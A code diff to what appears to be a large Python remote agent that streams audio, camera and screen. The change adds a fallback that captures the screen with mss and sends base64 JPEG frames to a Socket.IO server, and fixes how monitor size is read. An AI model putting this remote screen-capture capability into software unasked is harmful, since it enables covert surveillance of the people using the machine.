@@ -4936,7 +4936,8 @@ def stream_screen(agent_id):
     Uses modern socket.io binary streaming.
     """
     log_message("Starting H.264 screen streaming...")
-    stream_screen_h264_socketio(agent_id)
+    # Route through a compatibility-safe runner that doesn't depend on definition order
+    return _run_screen_stream(agent_id)
 
 # JPEG fallback screen streaming removed - now using H.264 socket.io binary streaming
 
@@ -5287,12 +5288,95 @@ def audio_send_worker(agent_id):
 
 # stream_screen_h264_socketio() is defined later after worker functions (line ~11851)
 
+def _run_screen_stream(agent_id):
+    """Thread target for screen streaming with robust fallbacks.
+    Tries WebRTC-or-socket chooser if available; otherwise runs a simple Socket.IO stream.
+    """
+    chooser = globals().get("stream_screen_webrtc_or_socketio")
+    h264_socket = globals().get("stream_screen_h264_socketio")
+    if callable(chooser):
+        return chooser(agent_id)
+    if callable(h264_socket):
+        return h264_socket(agent_id)
+    # Final fallback that works even during early initialization
+    log_message("Using simple Socket.IO screen stream (compat mode)")
+    return stream_screen_simple_socketio(agent_id)
+
+def stream_screen_simple_socketio(agent_id):
+    """Compatibility fallback: single-threaded JPEG-over-Socket.IO screen stream.
+    Used when modern streaming functions are not yet defined during startup.
+    """
+    global STREAMING_ENABLED
+    if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
+        log_message("Required modules not available for simple screen capture", "error")
+        return False
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available for simple screen streaming", "error")
+        return False
+    try:
+        import mss
+        with mss.mss() as sct:
+            monitors = sct.monitors
+            monitor_index = 1 if len(monitors) > 1 else 0
+            monitor = monitors[monitor_index]
+            # Derive initial dimensions and apply downscale cap similar to worker path
+            width = int(monitor.get('width', 0) or (monitor['right'] - monitor['left'])) if isinstance(monitor, dict) else (
+                monitor[2] - monitor[0]
+            )
+            height = int(monitor.get('height', 0) or (monitor['bottom'] - monitor['top'])) if isinstance(monitor, dict) else (
+                monitor[3] - monitor[1]
+            )
+            if width > 1280:
+                scale = 1280 / width
+                width = int(width * scale)
+                height = int(height * scale)
+            frame_time = 1.0 / max(1, int(TARGET_FPS) if 'TARGET_FPS' in globals() else 15)
+            log_message("Started simple Socket.IO screen stream (compat mode).")
+            next_not_connected_log_time = 0.0
+            while STREAMING_ENABLED:
+                start_ts = time.time()
+                sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
+                img = np.array(sct_img)
+                if img.shape[1] != width or img.shape[0] != height:
+                    img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
+                if img.shape[2] == 4:
+                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+                ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                if ok:
+                    connected = SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)
+                    if not connected:
+                        # Throttle log to avoid spam until socket connects
+                        now = time.time()
+                        if now >= next_not_connected_log_time:
+                            log_message("Socket.IO not connected; deferring screen frames")
+                            next_not_connected_log_time = now + 5.0
+                    else:
+                        try:
+                            b64 = base64.b64encode(encoded.tobytes()).decode('utf-8')
+                            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': f'data:image/jpeg;base64,{b64}'})
+                        except Exception as send_err:
+                            # Silence namespace/connection race errors and retry on next loop
+                            msg = str(send_err)
+                            if "not a connected namespace" in msg or "Connection is closed" in msg:
+                                pass
+                            else:
+                                log_message(f"Simple stream send error: {send_err}")
+                # FPS pacing
+                elapsed = time.time() - start_ts
+                sleep_for = frame_time - elapsed
+                if sleep_for > 0:
+                    time.sleep(sleep_for)
+            return True
+    except Exception as e:
+        log_message(f"Simple screen streaming error: {e}", "error")
+        return False
+
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
     if not STREAMING_ENABLED:
         STREAMING_ENABLED = True
-        # Use smart streaming that automatically chooses WebRTC or Socket.IO
-        STREAM_THREAD = threading.Thread(target=stream_screen_webrtc_or_socketio, args=(agent_id,))
+        # Use a safe wrapper that defers until functions are defined
+        STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
         log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
@@ -5556,7 +5640,7 @@ def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enab
         log_message("WebRTC not available, using fallback Socket.IO streaming", "warning")
         # Fallback to existing Socket.IO streaming
         if enable_screen:
-            stream_screen_h264_socketio(agent_id)
+            start_streaming(agent_id)
         if enable_audio:
             start_audio_streaming(agent_id)
         if enable_camera:
@@ -11773,9 +11857,16 @@ def screen_capture_worker(agent_id):
         return
     with mss.mss() as sct:
         monitors = sct.monitors
-        monitor_index = 1
-        width = monitors[monitor_index][2] - monitors[monitor_index][0]
-        height = monitors[monitor_index][3] - monitors[monitor_index][1]
+        monitor_index = 1 if len(monitors) > 1 else 0
+        monitor = monitors[monitor_index]
+        # mss returns monitor dicts with left/top/right/bottom; newer may include width/height
+        if isinstance(monitor, dict):
+            width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
+            height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
+        else:
+            # fallback tuple-style indexing
+            width = monitor[2] - monitor[0]
+            height = monitor[3] - monitor[1]
         if width > 1280:
             scale = 1280 / width
             width = int(width * scale)
@@ -11783,7 +11874,7 @@ def screen_capture_worker(agent_id):
         frame_time = 1.0 / TARGET_FPS
         while STREAMING_ENABLED:
             start = time.time()
-            sct_img = sct.grab(monitors[monitor_index])
+            sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
             img = np.array(sct_img)
             if img.shape[1] != width or img.shape[0] != height:
                 img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
